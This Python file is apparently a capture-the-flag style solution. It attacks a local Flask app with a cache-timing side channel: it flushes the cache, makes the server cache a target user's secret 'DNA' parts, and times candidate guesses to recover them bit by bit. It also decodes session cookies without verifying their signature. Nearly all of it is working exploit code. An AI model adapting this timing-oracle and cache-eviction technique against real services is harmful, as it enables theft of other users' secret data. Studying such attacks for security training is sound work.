import time
import requests
import numpy as np
from itertools import product
from itsdangerous.exc import *
from itsdangerous.url_safe import URLSafeTimedSerializer
from flask.sessions import session_json_serializer
from tqdm import tqdm

BITS_IN_NUCLEOTIDE = 2
BITS_TO_NUCLEOTIDE = {
    '00': 'C',
    '01': 'G',
    '10': 'A',
    '11': 'T'
}
NUCLEOTIDE_TO_BITS = {
    'C': '00',
    'G': '01',
    'A': '10',
    'T': '11'
}
BIT_LEN = 38
PART_ORDER = ['body', 'head', 'eyes', 'nose', 'ears', 'mouth']
PART_TO_BITLEN = {
    'body': 6,
    'head': 8,
    'eyes': 8,
    'nose': 1,
    'ears': 7,
    'mouth': 8
}

part_right_offsets = [sum([PART_TO_BITLEN[prev] for prev in PART_ORDER[i:]]) for i in range(1, len(PART_ORDER)+1)]
PART_TO_RIGHT_OFFSET = {part: offset for part, offset in zip(PART_ORDER, part_right_offsets)}

def bitstring_to_dna(bitstring):
    bit_chunks = [bitstring[i: i + BITS_IN_NUCLEOTIDE] for i in range(0, len(bitstring), BITS_IN_NUCLEOTIDE)]
    nucleotides = [BITS_TO_NUCLEOTIDE[chunk] for chunk in bit_chunks]
    return ''.join(nucleotides)

def dna_to_bitstring(dna):
    return ''.join([NUCLEOTIDE_TO_BITS[nuc] for nuc in dna])

def part_bits_from_bitstring(part, bitstring):
    no_tail = bitstring[:-PART_TO_RIGHT_OFFSET[part]]
    return no_tail[-PART_TO_BITLEN[part]:]

class CacheAttacker():
    # verbosity
    DISPLAY_AMNT = 20

    # Attack Defaults
    DEFAULT_MEASURE_COUNT = 5
    DEFAULT_SERVER_URL = "http://127.0.0.1:5000"

    # Attack Consts 
    MAX_CACHE_SIZE = 64
    SESSION_COOKIE = "session"
    INTERNAL_SESSION_NAME = "SessionId"
    MAX_QUERIES = 2048

    def __init__(self, user_id=666, server=None, reps=None, verbose=False, session_cookie=None, pedantic=False):
        self.user_id = user_id
        self.verbose = verbose
        self.pedantic = pedantic
        self.queries = 0

        if reps is None:
            self.reps = CacheAttacker.DEFAULT_MEASURE_COUNT
        else:
            self.reps = reps

        if server is None:
            self.server = self.DEFAULT_SERVER_URL
        else:
            self.server = server
        
        if session_cookie is None:
            self.start_new_session()
        else:
            self.session_cookie = session_cookie

    @property
    def ssid(self):
        session_serializer = URLSafeTimedSerializer("random-key-which-is-wrong", serializer=session_json_serializer)
        _, payload = session_serializer.loads_unsafe(self.session_cookie)
        return payload[CacheAttacker.INTERNAL_SESSION_NAME]
    
    def start_new_session(self):
        resp = requests.get(f"{self.server}")
        self.session_cookie = resp.cookies[self.SESSION_COOKIE]

    def leak_user_part_to_cache(self, part):
        request_params = {"part": part, "id": self.user_id}
        request_cookies = {self.SESSION_COOKIE: self.session_cookie}
        start = time.time()
        requests.post(f"{self.server}/api/part_from_user", data=request_params, cookies=request_cookies)
        end = time.time()

        self.queries += 1
        if self.queries % self.MAX_QUERIES == 0:
            print(f"Warning: made {self.queries} queries to session {self.ssid} - the user might have shapeshifted!")
        return end - start

    def load_part_bits_to_cache(self, part, part_bits):
        right_pad = '0' * PART_TO_RIGHT_OFFSET[part]
        part_bitstring = (part_bits + right_pad).zfill(BIT_LEN)
        request_params = {"part": part, "dna": bitstring_to_dna(part_bitstring)}
        request_cookies = {self.SESSION_COOKIE: self.session_cookie}
        
        start = time.time()
        requests.post(f"{self.server}/api/part_from_dna", data=request_params, cookies=request_cookies)
        end = time.time()
        return end - start
    
    def flush_cache_from_part(self, part):
        if part == PART_ORDER[0]:
            flush_part = PART_ORDER[1]
        else:
            flush_part = PART_ORDER[0]

        # load arbitrary, elements of a different part to flush the original away
        part_options = product('01', repeat=PART_TO_BITLEN[flush_part])
        for _, bits in zip(range(CacheAttacker.MAX_CACHE_SIZE), part_options):
            self.load_part_bits_to_cache(flush_part, ''.join(bits))
    
    def find_part(self, part, reps=None):
        if reps is None:
            reps = self.DEFAULT_MEASURE_COUNT
        candidates = [''.join(bits) for bits in product('01', repeat=PART_TO_BITLEN[part])]
        all_times = {cand: [] for cand in candidates}   # stores time records
        for rep in tqdm(range(reps), ascii=True, desc=f"Attacking {part.capitalize()}"):
            if rep == 0 or self.MAX_CACHE_SIZE >= len(candidates):
                # Optimization, no need to flush if old values will be evicted anyways
                self.flush_cache_from_part(part)
            
            for i, cand in enumerate(candidates):
                # ensures the part is always cached
                if i % self.MAX_CACHE_SIZE == 0:
                    self.leak_user_part_to_cache(part)
                
                all_times[cand].append(self.load_part_bits_to_cache(part, cand))

        fastest_times = {cand: min(cand_times) for cand, cand_times in all_times.items()}
        fastest_cand = min(candidates, key=lambda cand: fastest_times[cand])

        accumelated_times = {cand: sum(all_times[cand]) for cand in candidates}
        sum_best = min(candidates, key=lambda cand: accumelated_times[cand])

        if self.verbose:
            # printing extra info about results
            sum_sorted_candidates = sorted(candidates, key=lambda cand: accumelated_times[cand])
            fastest_sorted_candidates = sorted(candidates, key=lambda cand: fastest_times[cand])
            print(f"{fastest_cand} had the fastest query time of {fastest_times[fastest_cand]:f} seconds")
            print(f"Top {self.DISPLAY_AMNT} by fastest time were:")
            for cand in fastest_sorted_candidates[:self.DISPLAY_AMNT]:
                print(f"Candidate: {cand}\tMeasurements: {all_times[cand]}\t Fastest: {fastest_times[cand]:f} sec.")
            print(f"{sum_best}'s total time was best, it took in total {accumelated_times[sum_best]:f} seconds")
            print(f"Top {self.DISPLAY_AMNT} by total time were:")
            for cand in sum_sorted_candidates[:self.DISPLAY_AMNT]:
                print(f"Candidate: {cand}\tMeasurements: {all_times[cand]}\t Total: {accumelated_times[cand]:f} sec.")
        
        if self.pedantic and sum_best != fastest_cand:
            print("Indecisive Results, Retrying")
            return self.find_part(part, reps=reps)
        
        return fastest_cand

FANCY_TEMPLATE = "[*] {} [*]\n"

def fancy_print(string):
    print(FANCY_TEMPLATE.format(string))

if __name__ == "__main__":
    # get session data or create it
    session_cookie = input('Insert your session cookie: ')
    if len(session_cookie) == 0:
        session_cookie = None

    # make attacker for session
    attacker = CacheAttacker(session_cookie=session_cookie)
    if session_cookie is None:
        fancy_print(f"Started a new session")
    
    # attack all parts and assemble 
    start = time.time()
    fancy_print(f"Attacking user {attacker.user_id} in session {attacker.ssid}")
    user_bitstring = ""
    for part in PART_ORDER:
        part_bits = attacker.find_part(part)
        fancy_print(f"Recovered bits for {part}: {part_bits}")
        user_bitstring += part_bits
    user_dna = bitstring_to_dna(user_bitstring)
    end = time.time()

    attack_minutes = (end - start) / 60
    fancy_print(f"Recovered DNA - {user_dna}, using {attacker.queries} queries and {attack_minutes:f} minutes")
    if session_cookie is None:
        fancy_print(f"The new session's cookie is {attacker.session_cookie}")

